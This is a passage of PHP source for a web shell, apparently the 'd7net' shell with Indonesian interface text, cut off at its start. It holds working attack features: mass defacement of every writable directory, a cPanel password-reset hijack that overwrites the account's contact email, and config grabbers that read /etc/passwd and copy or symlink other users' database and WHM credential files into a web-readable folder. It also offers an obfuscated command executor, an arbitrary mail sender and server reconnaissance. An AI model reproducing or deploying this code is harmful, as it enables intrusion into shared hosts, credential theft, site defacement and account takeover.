                            file_put_contents($serlok, $isi_script);
                            $idx = sabun_massal($dirc,$namafile,$isi_script);
                        }
                    }
                }
            }
        }
    }
    function sabun_biasa($dir,$namafile,$isi_script) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $serlok = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($serlok, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($serlok, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "http://$dirb/$namafile<br>";
                            file_put_contents($serlok, $isi_script);
                        }
                    }
                }
            }
        }
    }
    if($_POST['start']) {
        if($_POST['tipe_sabun'] == 'mahal') {
            echo "<table class=\"directory-listing-table\"><thead><td><div style='margin: 5px auto; padding: 5px'>";
            sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</div></td></thead></table>";
        } elseif($_POST['tipe_sabun'] == 'murah') {
            echo "<table class=\"directory-listing-table\"><thead><td><div style='margin: 5px auto; padding: 5px'>";
            sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</div></td></thead></table>";
        }
} else {
    echo "<table class=\"directory-listing-table\"><thead><td><center>";
    echo "<form method='post'>
    <font style='text-decoration: ;'>Tipe Sabun:</font><br>
    <input type='radio' name='tipe_sabun' value='murah' checked>Biasa
    <input type='radio' name='tipe_sabun' value='mahal'>Massal<br><br>
    <font style='text-decoration: ;'>Directory:</font><br>
    <input type='text' name='d_dir' value='$serlok' style='width: 450px;height: 20px;'><br>
    <font style='text-decoration: ;'>Nama File:</font><br>
    <input type='text' name='d_file' value='' style='width: 450px;height: 20px;' placeholder='file.html'><br>
    <font style='text-decoration: ;'>Isi File:</font><br>
    <textarea name='script' style='width: 600px; height: 250px;' placeholder='Hello World'></textarea><br>
    <button type='submit' class='pencet' name='start' value='Submit' style='width:150px; height:35px;'>Submit</button><br>
    </form></center></td></thead></table><br>";
    }
    exit();
    } elseif ($_GET['Changemod'] == "opet") {
        echo "<table class=\"directory-listing-table\"><thead><td>
        <form method='post'><h3>Change Permission<br></h3>
        File/Folder :<br>
        <input type='text' class='form-control' value='$serlok/write_here' style='width:570px; height:20px;' name='pile'/><br><br>Select Chmod :<br>
        <input type='radio' class='form-control' name='tipe_mod' value='0444' checked>
        <font color=red>0444</font>&nbsp;&nbsp;
        <input type='radio' class='form-control' name='tipe_mod' value='0555'>
        <font color=red>0555</font>&nbsp;&nbsp;
        <input type='radio' class='form-control' name='tipe_mod' value='0644'>
        <font color=lime>0644</font>&nbsp;&nbsp;
        <input type='radio' class='form-control' name='tipe_mod' value='0664'>
        <font color=lime>0664</font>&nbsp;&nbsp;
        <input type='radio' class='form-control' name='tipe_mod' value='0666'>
        <font color=lime>0666</font>&nbsp;&nbsp;
        <input type='radio' class='form-control' name='tipe_mod' value='0744'>
        <font color=lime>0744</font>&nbsp;&nbsp;
        <input type='radio' class='form-control' name='tipe_mod' value='0775'>
        <font color=lime>0775</font>&nbsp;&nbsp;
        <input type='radio' class='form-control' name='tipe_mod' value='0755'>
        <font color=lime>0755</font>&nbsp;&nbsp;
        <input type='radio' class='form-control' name='tipe_mod' value='0777'>
        <font color=lime>0777</font><br><br>
        Chmod Brutal :v : <br>
        <input type='radio' class='form-control' name='tipe_mod' value='0400'>
        <font color=red>0400</font>&nbsp;&nbsp;
        <input type='radio' class='form-control' name='tipe_mod' value='0044'>
        <font color=red>0044</font>&nbsp;&nbsp;
        <input type='radio' class='form-control' name='tipe_mod' value='0000'>
        <font color=red>0000</font>&nbsp;&nbsp; 
        <br><br>
        <button type='submit' class='pencet' name='lokit' value='Submit' style='width:120px; height:30px;'>Change</button><br></input></td></thead></table></form>";
        if (isset($_POST['lokit'])) {
            if($_POST['tipe_mod'] == '0444') {
              $opet = @chmod($_POST['pile'], 0444);
            } elseif($_POST['tipe_mod'] == '0555') {
              $opet = @chmod($_POST['pile'], 0555);
            } elseif($_POST['tipe_mod'] == '0644') {
              $opet = @chmod($_POST['pile'], 0644);
            } elseif($_POST['tipe_mod'] == '0664') {
              $opet = @chmod($_POST['pile'], 0664);
            } elseif($_POST['tipe_mod'] == '0666') {
              $opet = @chmod($_POST['pile'], 0666);
            } elseif($_POST['tipe_mod'] == '0744') {
              $opet = @chmod($_POST['pile'], 0744);
            } elseif($_POST['tipe_mod'] == '0775') {
              $opet = @chmod($_POST['pile'], 0775);
            } elseif($_POST['tipe_mod'] == '0755') {
              $opet = @chmod($_POST['pile'], 0755);
            } elseif($_POST['tipe_mod'] == '0777') {
              $opet = @chmod($_POST['pile'], 0777);
              /* chmod brutal :v */
            } elseif($_POST['tipe_mod'] == '0400') {
              $opet = @chmod($_POST['pile'], 0400);
            } elseif($_POST['tipe_mod'] == '0044') {
              $opet = @chmod($_POST['pile'], 0044);
            } elseif($_POST['tipe_mod'] == '0000') {
              $opet = @chmod($_POST['pile'], 0000);
          }
        $d7net = $opet;
        $mod = $_POST['tipe_mod'];
        $piles = $_POST['pile'];
        if ($d7net == true) {
            echo "<br><table class=\"directory-listing-table\"><thead><td>[+] <font color=lime>Successfully!!</font> [+]<br>Change to => $mod <br><font color=orange> $piles</font></center></td></thead></table>";
        } else {
            echo "<br><table class=\"directory-listing-table\"><thead><td>File/Dir doesn't exist => <font color=red>$piles</font></td></thead></table>";
            }
        }exit();
    
    } elseif ($_GET['tool'] == "opet") {
echo '<table class="directory-listing-table"><thead><td><center><font color=orange>Pilih tools nya mazze</font><br><hr color=darkslateblue><br>
<button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&grab_config=opet">Grab Config</button>&nbsp;
&nbsp;<button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&mas-file=opet">Mass Deface</button>&nbsp;
&nbsp;<button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&lompat=opet">Jumping</button>&nbsp;
&nbsp;<button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&cp-reset=opet">Cp Reset</button>&nbsp;';
        echo "<br><br><hr color=darkslateblue></center></td></thead></table>";
        exit(0);
            } elseif ($_GET['grab_config'] == "opet") {
                echo '<table class="directory-listing-table"><thead><td>
                <button onclick=location.href="?path='.$serlok.'&tool=opet" class=\'pencet\' style=\'width:80px; height:25px;\'>&#60;Tools&nbsp;</button><br><br><center>
                Config Grabber<hr color=darkslateblue>
                <button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&grbconfig=opet">Grab Config</button>&nbsp;
                <button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&grbconfig2=opet">Grab Config 2</button>&nbsp;
                <button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&grbconfig3=opet">Grab Config 3</button>&nbsp;
                <hr color=darkslateblue></center></td></thead></table>';
                exit();
} elseif ($_GET['cp-reset'] == "opet") {
                echo '<table class="directory-listing-table"><thead><td>
        <br>
         <center>
         <h2>Cpanel Reset Password</h2>
         <br>Tools ini work di Folder home [ ex:/home/user/.contactemail ]<br><br>
        <form action="" method="post">
    <input type="email" name="email" placeholder="Email" class="form-control" style = "width:250px; height:40px;" autocomplete="off"  />
    <br>
    <button type="submit" name="submit" class="pencet" style="width:250px; height:40px;">Reset!!</button>

    </form>
    <br>
    </div>
         </center>
     ';
            $user = get_current_user();
            $site = $_SERVER['HTTP_HOST'];
            $ips = getenv('REMOTE_ADDR');

            if (isset($_POST['submit'])) {
                $email = $_POST['email'];
                $wr = 'email:' . $email;
                $wc = "$email";
                $ganti1 = '/home/' . $user . '/.cpanel/contactinfo';
                $ganti2 = '/home/' . $user . '/.contactemail';
                $f = fopen('/home/' . $user . '/.cpanel/contactinfo', 'w');
                fwrite($f, $wr);
                fclose($f);
                $fwc = fopen('/home/' . $user . '/.contactemail', 'w');
                fwrite($fwc, $wc);
                fclose($fwc);
                $d7nets = 
                "$ganti1 => <font color=lime>Change Email success!</font><br>
                $ganti2 => <font color=lime>Change Email success!</font><br>
                Link : <font color=orange>" . $site . ':2083/resetpass?start=1</font> <a href="http://' . $site . ':2083/resetpass?start=1" target="_blank" class="pencet">visit</a>
                <br>Username : <font color=orange>' . $user .'</font>
                <br>Email <font color=orange>: '.$email.'</font>';
                echo '<center><table width="35%" border="0" cellpadding="3" cellspacing="1" align="center"><td width="12%">' . $d7nets . '</center></td></thead></table><br>';
            };exit();

    } elseif ($_GET['grbconfig3'] == "opet") {
               echo "<table class=\"directory-listing-table\"><thead><td><center>Coming soon!!</center></td></thead></table>";
               exit();
} elseif ($_GET['e-mail'] == "opet") {
    echo "<table class=\"directory-listing-table\"><thead><td>";
    echo "<table width=\"50%\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\"><td><center><br>
    <form method=\"post\">
    Kepada : <br>
<input type=\"email\" name=\"to_email\" placeholder=\"Email\" style=\"width:250px; height:40px;\" autocomplete=\"off\" required/><br><br>Subjek :<br>
<input type=\"text\" name=\"subject\" placeholder=\"Subjek\" style=\"width:250px; height:40px;\" required/><br><br>Isi Pesan :<br>
<textarea type=\"text\" name=\"message\" placeholder=\"Message\" style=\"width:550px; height:210px;\" required></textarea><br>
<button type=\"submit\" name=\"sendmail\" value=\"Kirim!\" class=\"pencet\" style=\"width:150px; height:40px\"/>Kirim!</button>
</form>";
if (isset($_POST['sendmail'])) {
    $to_email = $_POST['to_email'];
    $d7nets = @mail($_POST['to_email'],$_POST['subject'],$_POST['message']); {
} if($d7nets == true) {
    echo "<br><br> Berhasil Mengirim Pesan ke <font color=lime>$to_email</font>";
    } else {
        echo "<br><br><font color=red>Gagal di kirim!!</font></td></table></center>";
        }
    } exit;
} elseif ($_GET['cmd'] == "opet") {
    echo "<table class=\"directory-listing-table\"><thead><td><center>";
    echo '<form method="post" onsubmit="document.getElementById(\'comandnya\').value = btoa(btoa(btoa(document.getElementById(\'comandnya\').value)))">
    <input type="text" name="komen" id="comandnya" style="background-color: #1f1f1f; color: #fff" placeholder="uname -a"><br>
    <input type="submit" name="comandeks" value=" >> " class="pencet" style="width:200px; height:28px;"></input>
    </form><br>';
    if (isset($_POST['comandeks'])) {
        ekse($_POST['komen'], $serlok);
    }
    echo "</center></td></thead></table>";
    exit();
    } elseif ($_GET['grbconfig2'] == "opet") {
            if ($_POST) {   
                $passwd = $_POST['passwd'];
                mkdir("d7net_config", 0777);
                $isi_htc = "Options all
Require None
Satisfy Any";
                $htc = fopen("d7net_config/.htaccess", "w");
                fwrite($htc, $isi_htc);
                preg_match_all('/(.*?):x:/', $passwd, $user_config);
                foreach ($user_config[1] as $user_D7net) {
                    $user_config_dir = "/home/$user_D7net/public_html/";
                    if (is_readable($user_config_dir)) {
                        $grab_config = array(
                            "/home/$user_D7net/.my.cnf" => "cpanel",
                            "/home/$user_D7net/.accesshash" => "WHM-accesshash",
                            "/home/$user_D7net/public_html/bw-configs/config.ini" => "BosWeb",
                            "/home/$user_D7net/public_html/config/koneksi.php" => "Lokomedia",
                            "/home/$user_D7net/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                            "/home/$user_D7net/public_html/clientarea/configuration.php" => "WHMCS",
                            "/home/$user_D7net/public_html/whm/configuration.php" => "WHMCS",
                            "/home/$user_D7net/public_html/whmcs/configuration.php" => "WHMCS",
                            "/home/$user_D7net/public_html/forum/config.php" => "phpBB",
                            "/home/$user_D7net/public_html/sites/default/settings.php" => "Drupal",
                            "/home/$user_D7net/public_html/config/settings.inc.php" => "PrestaShop",
                            "/home/$user_D7net/public_html/app/etc/local.xml" => "Magento",
                            "/home/$user_D7net/public_html/joomla/configuration.php" => "Joomla",
                            "/home/$user_D7net/public_html/configuration.php" => "Joomla",
                            "/home/$user_D7net/public_html/wp/wp-config.php" => "WordPress",
                            "/home/$user_D7net/public_html/wordpress/wp-config.php" => "WordPress",
                            "/home/$user_D7net/public_html/wp-config.php" => "WordPress",
                            "/home/$user_D7net/public_html/admin/config.php" => "OpenCart",
                            "/home/$user_D7net/public_html/slconfig.php" => "Sitelok",
                            "/home/$user_D7net/public_html/application/config/database.php" => "Ellislab",
                            "/home1/$user_D7net/.my.cnf" => "cpanel",
                            "/home1/$user_D7net/.accesshash" => "WHM-accesshash",
                            "/home1/$user_D7net/public_html/bw-configs/config.ini" => "BosWeb",
                            "/home1/$user_D7net/public_html/config/koneksi.php" => "Lokomedia",
                            "/home1/$user_D7net/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                            "/home1/$user_D7net/public_html/clientarea/configuration.php" => "WHMCS",
                            "/home1/$user_D7net/public_html/whm/configuration.php" => "WHMCS",
                            "/home1/$user_D7net/public_html/whmcs/configuration.php" => "WHMCS",
                            "/home1/$user_D7net/public_html/forum/config.php" => "phpBB",
                            "/home1/$user_D7net/public_html/sites/default/settings.php" => "Drupal",
                            "/home1/$user_D7net/public_html/config/settings.inc.php" => "PrestaShop",
                            "/home1/$user_D7net/public_html/app/etc/local.xml" => "Magento",
                            "/home1/$user_D7net/public_html/joomla/configuration.php" => "Joomla",
                            "/home1/$user_D7net/public_html/configuration.php" => "Joomla",
                            "/home1/$user_D7net/public_html/wp/wp-config.php" => "WordPress",
                            "/home1/$user_D7net/public_html/wordpress/wp-config.php" => "WordPress",
                            "/home1/$user_D7net/public_html/wp-config.php" => "WordPress",
                            "/home1/$user_D7net/public_html/admin/config.php" => "OpenCart",
                            "/home1/$user_D7net/public_html/slconfig.php" => "Sitelok",
                            "/home1/$user_D7net/public_html/application/config/database.php" => "Ellislab",
                            "/home2/$user_D7net/.my.cnf" => "cpanel",
                            "/home2/$user_D7net/.accesshash" => "WHM-accesshash",
                            "/home2/$user_D7net/public_html/bw-configs/config.ini" => "BosWeb",
                            "/home2/$user_D7net/public_html/config/koneksi.php" => "Lokomedia",
                            "/home2/$user_D7net/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                            "/home2/$user_D7net/public_html/clientarea/configuration.php" => "WHMCS",
                            "/home2/$user_D7net/public_html/whm/configuration.php" => "WHMCS",
                            "/home2/$user_D7net/public_html/whmcs/configuration.php" => "WHMCS",
                            "/home2/$user_D7net/public_html/forum/config.php" => "phpBB",
                            "/home2/$user_D7net/public_html/sites/default/settings.php" => "Drupal",
                            "/home2/$user_D7net/public_html/config/settings.inc.php" => "PrestaShop",
                            "/home2/$user_D7net/public_html/app/etc/local.xml" => "Magento",
                            "/home2/$user_D7net/public_html/joomla/configuration.php" => "Joomla",
                            "/home2/$user_D7net/public_html/configuration.php" => "Joomla",
                            "/home2/$user_D7net/public_html/wp/wp-config.php" => "WordPress",
                            "/home2/$user_D7net/public_html/wordpress/wp-config.php" => "WordPress",
                            "/home2/$user_D7net/public_html/wp-config.php" => "WordPress",
                            "/home2/$user_D7net/public_html/admin/config.php" => "OpenCart",
                            "/home2/$user_D7net/public_html/slconfig.php" => "Sitelok",
                            "/home2/$user_D7net/public_html/application/config/database.php" => "Ellislab",
                            "/home3/$user_D7net/.my.cnf" => "cpanel",
                            "/home3/$user_D7net/.accesshash" => "WHM-accesshash",
                            "/home3/$user_D7net/public_html/bw-configs/config.ini" => "BosWeb",
                            "/home3/$user_D7net/public_html/config/koneksi.php" => "Lokomedia",
                            "/home3/$user_D7net/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                            "/home3/$user_D7net/public_html/clientarea/configuration.php" => "WHMCS",
                            "/home3/$user_D7net/public_html/whm/configuration.php" => "WHMCS",
                            "/home3/$user_D7net/public_html/whmcs/configuration.php" => "WHMCS",
                            "/home3/$user_D7net/public_html/forum/config.php" => "phpBB",
                            "/home3/$user_D7net/public_html/sites/default/settings.php" => "Drupal",
                            "/home3/$user_D7net/public_html/config/settings.inc.php" => "PrestaShop",
                            "/home3/$user_D7net/public_html/app/etc/local.xml" => "Magento",
                            "/home3/$user_D7net/public_html/joomla/configuration.php" => "Joomla",
                            "/home3/$user_D7net/public_html/configuration.php" => "Joomla",
                            "/home3/$user_D7net/public_html/wp/wp-config.php" => "WordPress",
                            "/home3/$user_D7net/public_html/wordpress/wp-config.php" => "WordPress",
                            "/home3/$user_D7net/public_html/wp-config.php" => "WordPress",
                            "/home3/$user_D7net/public_html/admin/config.php" => "OpenCart",
                            "/home3/$user_D7net/public_html/slconfig.php" => "Sitelok",
                            "/home3/$user_D7net/public_html/application/config/database.php" => "Ellislab"
                        );
                        foreach ($grab_config as $config => $nama_config) {
                            $ambil_config = file_get_contents($config);
                            if ($ambil_config == '') {
                            } else {
                                $file_config = fopen("/d7net_config/$user_D7net-$nama_config.txt", "w");
                                fputs($file_config, $ambil_config);
                            }
                        }
                    }
                }
                echo "<table class=\"directory-listing-table\"><thead><td><center>
                <font color=lime>DONE</font> => 
                <button onclick=location.href='?path=$serlok/d7net_config' class='pencet' style='width:80px; height:25px'>Click Here</button></td></thead></table>";
            } else {
                echo "<table class=\"directory-listing-table\"><thead><td><button onclick=location.href='?path=".$serlok."&grab_config=opet' class='pencet' style='width:80px; height:25px;'>&#60;back&nbsp;</button><center>";
                echo "Config Grabber 2<br><br>";
                echo "<form method=\"post\" action=\"\"> <textarea name=\"passwd\" class='area form-control' cols='100' rows='25'>
";
                echo file_get_contents('/etc/passwd');
                echo "</textarea><br><button type=\"submit\" class = 'pencet' style='width:150px; height:35px'>Sikat..!!</button></center>
";
                echo "</center></td></thead></table>";
            }exit();
    } elseif ($_GET['grbconfig'] == "opet") {
@ini_set('max_execution_time',0); 
@ini_set('display_errors', 0); 
@ini_set('file_uploads',1);
echo '<table class="directory-listing-table"><thead><td><button onclick=location.href="?path='.$serlok.'&grab_config=opet" class=\'pencet\' style=\'width:80px; height:25px;\'>&#60;back&nbsp;</button><center>Config Grabber<br><br><form method="POST"><textarea cols="100" name="passwd"  rows="25">'; 
$uSr=file("/etc/passwd"); 
foreach($uSr as $usrr) { 
$str=explode(":",$usrr); echo $str[0]."
"; } 
echo'</textarea><br><input type="hidden" class="input" name="folfig" value="d7netcfg" size=40 />
<select class="inp"  title="Select Your TypeFile"  name="type" size=""><option>--- select ---</option><option title="type txt" value=".txt">.txt</option><option title="type php" value=".php">.php</option><option title="type shtml" value=".shtml">.shtml</option><option title="type ini" value=".ini">.ini</option><option title="type html" value=".html">.html</option></select><br><br>
<input name="conf" size="80" class="ipt" value="GASS!" type="submit">
</td></thead></table></form></center><br>';
} if($_POST['conf']) {
$folfig = $_POST['folfig']; $type = $_POST['type'];
@mkdir($folfig, 0755); 
@chdir($folfig);
$htaccess="
Options Indexes FollowSymLinks

DirectoryIndex .my.cnf

AddType txt .php

AddType txt .my.cnf

AddType txt .accesshash

AddHandler txt .php

AddHandler txt .cnf

AddHandler txt .accesshash
";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);
$passwd=explode("
",$_POST["passwd"]);
foreach($passwd as $pwd){ $user=trim($pwd);
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vBulletin1.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-vBulletin3.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-vBulletin4.txt');
@symlink('/home/'.$user.'/public_html/config.php',$user.'-Phpbb1.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Phpbb2.txt');
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wordpress1.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress2.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla1.txt');
@symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla2.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla3.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-Whm1.txt');
@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-Whm2.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-Whm3.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-Whm4.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-Whm5.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-Whm6.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-Whm7.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-Whm8.txt');
@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-Whm9.txt');
@symlink('/home/'.$user.'/public_html/admin/conf.php',$user.'-5.txt');
@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'-4.txt');
@symlink('/home/'.$user.'/public_html/conf_global.php',$user.'-invisio.txt');
@symlink('/home/'.$user.'/public_html/include/db.php',$user.'-7.txt');
@symlink('/home/'.$user.'/public_html/connect.php',$user.'-8.txt');
@symlink('/home/'.$user.'/public_html/mk_conf.php',$user.'-mk-portale1.txt');
@symlink('/home/'.$user.'/public_html/include/config.php',$user.'-12.txt');
@symlink('/home/'.$user.'/public_html/settings.php',$user.'-Smf.txt');
@symlink('/home/'.$user.'/public_html/includes/functions.php',$user.'-phpbb3.txt');
@symlink('/home/'.$user.'/public_html/include/db.php',$user.'-infinity.txt');
@symlink('/home/'.$user.'/.my.cnf',$user.'-cpanel.txt');
@symlink('/home/'.$user.'/.accesshash',$user.'-whm.txt');
@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'-opencart.txt');
@symlink('/home/'.$user.'/public_html/slconfig.php',$user.'-sitelok.txt');
@symlink('/home/'.$user.'/public_html/application/config/database.php',$user.'-elislab.txt');
@symlink('/home/'.$user.'/public_html/app/etc/local.xml',$user.'-mangentot.txt');
@symlink('/home/'.$user.'/public_html/config/koneksi.php',$user.'-lokmed.txt');
@symlink('/home/'.$user.'/public_html/po-library/po-config.php',$user.'-popojembut.txt');
@symlink('/home/'.$user.'/public_html/lokomedia/config/koneksi.php',$user.'-lokmed.txt');
echo '<table class="directory-listing-table"><thead><td><center>Done => <a href='.$folfig.' target="_blank" class="button">Click Here</a></center></td></thead></table><br>';
}exit();
} elseif ($_REQUEST['buatfile'] == "opet") {    
        echo "<center><table class='directory-listing-table'><thead><td width='12%''>
    <form method='POST'>
        <input type='text' class='form-control' value='$serlok/file.txt' placeholder='Nama File' style='width: 525px;' name='nama_file' autocomplete='off'><br><br>
        <textarea name='isi_file' class='form-control' rows='20' cols='100' placeholder='Hello World!'></textarea><br/>
        <button type='sumbit' class='pencet' style='width:537px; height:32px;' height:30;' name='bikin'>Create!!</button><br>
    </form></center>";
    if (isset($_POST['bikin'])) {
        $nama_file = $_POST['nama_file'];
        $isi_file = $_POST['isi_file'];
        $handle = fopen("$nama_file", 'w');

        if (fwrite($handle, $isi_file)) {
            echo '</center></center>OK!! ~>&nbsp;<font color="lime"><i>'.$nama_file.'</i></font>';
        } else {
            echo '<font color=red>Failed!</font></script></td></thead></table><br />';
        }
    }exit();
} elseif ($_GET['buatfolder'] == "opet") {
      function createDirectory() {
        $add = $_POST["add"];
        $d7net = mkdir($add);
        if ($d7net == true) {
            echo "<table class='directory-listing-table'><thead><td>Successfully!! =><font color=lime> $add</font></td></thead></table>";
    } else {
            echo "<table class='directory-listing-table'><thead><td><font color=red> Failed to create folder!!</font></td></thead></table>";
        }
}
        if (!isset($_POST['submit'])) {
            echo '<table class=\'directory-listing-table\'><thead><td>
        <form action="" method = "POST">New Folder<br><br>
         <input type="text" style="width: 520px;"  class="form-control" value="'.$serlok.'/d7net_folder" name="add" id="add"/><br><br>
        <button type="submit" class="pencet" style="width:200px; height:30px;" name="submit" 
                        value="Create directory">Create</button></form></td></thead></table>';
        } else {
            createDirectory();
        }exit();
} elseif ($_REQUEST['info'] == "opet") {
    echo "<table class='directory-listing-table' align='center'><thead><tr><td>";
    echo "Server : <font color=orang>".$_SERVER['HTTP_HOST']."</font><br>";
    echo "Server IP : <font color=orange>".ipserv()."</font> &nbsp;<br> Your IP : <font color=orange>".$_SERVER['REMOTE_ADDR']."</font><br>";
    echo "Web Server : <font color='orange'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
    echo "System : <font color='orange'>".php_uname()."</font><br>";
    echo "User : <font color='orange'>".@get_current_user()."&nbsp;</font>( <font color='orange'>".@getmyuid()."</font>)<br>";
    echo "PHP Version : <font color='orange'>".@phpversion()."&nbsp;</font>=><font color='orange'>&nbsp;".php_sapi_name()."</font><br>";
    echo "</tr></td><tr><td>Disable Function : ".$disf."</font><br>";
    echo "</tr></td><tr><td>";
    echo "Orecle : ";
if (function_exists('oci_connect')) {
        echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";

    echo "&nbsp;<br>SSH2 : ";
}

if (function_exists('ssh2_connect')) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";

    echo "&nbsp;<br>MySQL : ";
}
if (function_exists("mysql_connect")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;<br> cURL : ";
if (function_exists("curl_init")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;<br> WGET : ";
if (file_exists("/usr/bin/wget")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;<br> Perl : ";
if (file_exists("/usr/bin/perl")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;<br> Python : ";
if (file_exists("/usr/bin/python2")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
    echo "</tr></td></thead></table><br>";
    exit();

}


if (!is_readable($serlok)) {
    die("<table class='directory-listing-table'><thead><td><center><font color=orange>This directory is unreadable :(</font></center></td></thead></table>");
}

echo '<div id="content"><table class="tab-filemanager" width="75%" align="center">
<thead>
<th><center>Name</center></th>
<th><center>Size</center></th>
<th><center>Type</center></th>
<th><center>Last Modified</center></th>
<th><center>Owner</center></th>
<th><center>Permissions</center></th>
<th><center>Options</center></th>
</thead><center>';

foreach($serlokbos as $dir){
    if(!is_dir($serlok."/".$dir) || $dir == '.') continue;
    echo "<tr>
    <td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?path=".$serlok."/".$dir."\">".$dir."</a></td>
    <td><center>--</center></td>
    <td><center><img src='https://img.icons8.com/external-vectorslab-flat-vectorslab/2x/external-folder-project-management-and-web-marketing-vectorslab-flat-vectorslab.png' alt='Smiley face' width='25' heght='25'></center></td>
    <td><center>".filedate($serlok."/".$dir)."</center></td>
    <td>".owner($serlok."/".$dir)."</td>
    <td><center>";
    if(is_writable($serlok."/".$dir)) echo '<font color="lime">';
    elseif(!is_readable($serlok."/".$dir)) echo '<font color="red">';
    echo statusnya($serlok."/".$dir);
    if(is_writable($serlok."/".$dir) || !is_readable($serlok."/".$dir)) echo '</font>';

    echo "</center></td>
    <td><center><form method=\"POST\" action=\"?pilihan&path=$serlok\">
    <select name=\"pilih\" class=\"button\">
    <option value=\"\"></option>
    <option value=\"hapus\">Delete</option>
    <option value=\"gantinama\">Rename</option>
    </select>
    <input type=\"hidden\" name=\"type\" value=\"dir\">
    <input type=\"hidden\" name=\"name\" value=\"$dir\">
    <input type=\"hidden\" name=\"path\" value=\"$serlok/$dir\">
<button type=\"submit\" name=\"submit\" class=\"pencet\" style=\"width:40px; height:30px;\"> >> </button>
    </form></center></td>
    </tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
foreach($serlokbos as $file) {
    if(!is_file("$serlok/$file")) continue;
    $size = filesize("$serlok/$file")/1024;
    $size = round($size,3);
    if($size >= 1024){
    $size = round($size/1024,2).' MB';
} else {
    $size = $size.' KB';
}

echo "<tr>
<td>".cekfile($serlok."/".$file)."
<button onclick=location.href=\"?viewfile=$serlok/$file&path=$serlok\" class=\"pencet\">view</button> $file</td>
<td><center>".$size."</center></td>
<td><center><img src='https://img.icons8.com/external-kmg-design-outline-color-kmg-design/2x/external-file-web-hosting-kmg-design-outline-color-kmg-design.png' alt='Smiley face' width='25' heght='25'></center></td>
<td><center>".filedate($serlok."/".$file)."</center></td>
<td>".owner($serlok."/".$file)."</td>
<td><center>";
if(is_writable("$serlok/$file")) echo '<font color="lime">';
elseif(!is_readable("$serlok/$file")) echo '<font color="red">';
echo statusnya("$serlok/$file");
if(is_writable("$serlok/$file") || !is_readable("$serlok/$file")) echo '</font>';
echo "</center></td>
<td><center>
<form method=\"post\" action=\"?pilihan&path=$serlok\">
<select name=\"pilih\" class=\"button\">
<option value=\"\">-Select-</option>
<option value=\"edit\">Edit</option>
<option value=\"gantinama\">Rename</option>
<option value=\"hapus\">Delete</option>";
if (class_exists("ZipArchive")) {
    echo "<option value=\"unzip\">Unzip</option>";
}
echo "</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$serlok/$file\">
<button type=\"submit\" name=\"submit\" class=\"pencet\" style=\"width:40px; height:30px;\"> >> </button>
</form></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($file){
$izin = substr(sprintf('%o', fileperms($file)), -4);
return $izin;
}
?>  
</body>
</html>
